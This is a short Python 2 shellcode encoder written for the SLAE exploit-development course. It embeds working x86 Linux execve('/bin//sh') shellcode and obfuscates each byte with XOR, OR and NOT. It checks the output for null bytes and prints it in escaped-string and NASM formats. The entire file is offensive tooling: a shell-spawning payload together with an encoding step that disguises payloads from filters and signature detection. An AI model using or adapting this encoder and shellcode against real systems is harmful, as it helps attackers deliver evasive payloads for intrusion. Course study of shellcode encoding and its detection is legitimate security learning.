#!/usr/bin/env python
#
# Script name		: encoder.py
# Author		: wetw0rk
# Version		: 1.0
# Created Following	: SLAE
# Description		: Simple encodes your shellcode via XOR,OR, and NOT.
#

# python objdump2shellcode.py -d execve -f python -b "\x00"
buf = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# output stored in here
raw = ""
asm = ""

for i in bytearray(buf):
	# encoding
	b = i ^ 0xDE	# XOR 0xOP,0xDE
	b = b | 0x00	# OR 0xOP,0x00
	b = ~b		# NOT 0xOP
	# normal format
	raw += '\\x'
	raw += '%02x' % (b & 0xff)
	# nasm format
	asm += '0x'
	asm += '%02x,' % (b & 0xff)

# detect for nulls
if "\\x00" in raw:
	print "[!!!] NULL DETECTED EXITING"

print "[!] Shellcode length : %d\n" % (len(bytearray(raw))/4)
# Evenly output the shellcode
print "[*] Normal format\n"
split = [raw[x:x+80] for x in range(0,len(raw),80)]
for i in range(len(split)):
	print split[i]
print "\n"
# Evenly output the shellcode
print "[*] Nasm format\n"
split = [asm[x:x+40] for x in range(0,len(asm),40)]
for i in range(len(split)):
	print split[i]
print "\n"
